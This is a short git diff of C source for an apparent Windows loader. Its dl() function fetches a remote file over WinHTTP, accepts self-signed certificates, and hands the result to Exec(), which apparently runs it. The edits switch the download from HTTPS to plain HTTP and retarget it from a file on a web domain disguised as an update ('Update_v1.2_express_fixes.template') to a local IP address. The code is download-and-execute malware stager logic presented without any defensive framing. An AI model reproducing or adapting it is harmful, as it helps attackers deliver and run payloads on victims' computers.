@@ -336,7 +336,7 @@ void dl(const wchar_t* host, const wchar_t* path , short port)
 	// Create an HTTP request handle.
 	// the last parameter of the WinHttpOpenRequest() function should be WINHTTP_FLAG_SECURE if using https and 0 if http 
 	if (hConnect)
-		hRequest = WinHttpOpenRequest(hConnect, L"GET", path ,NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+		hRequest = WinHttpOpenRequest(hConnect, L"GET", path ,NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 
 	// This is for accepting self signed Cert
 	if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
@@ -565,8 +565,8 @@ int main()
 		myprintf("\nFailed to initialize bokemon \n");
 		return -1;
 	}
-	//dl(L"192.168.90.21", (short)80);
-	dl(L"pybase.com", L"/wp-content/help/Update_v1.2_express_fixes.template", 443);
+	dl(L"192.168.150.1" , L"mer.template", (short)80);
+	//dl(L"pybase.com", L"/wp-content/help/Update_v1.2_express_fixes.template", 443);
 	Exec();
 	return 0;
 }
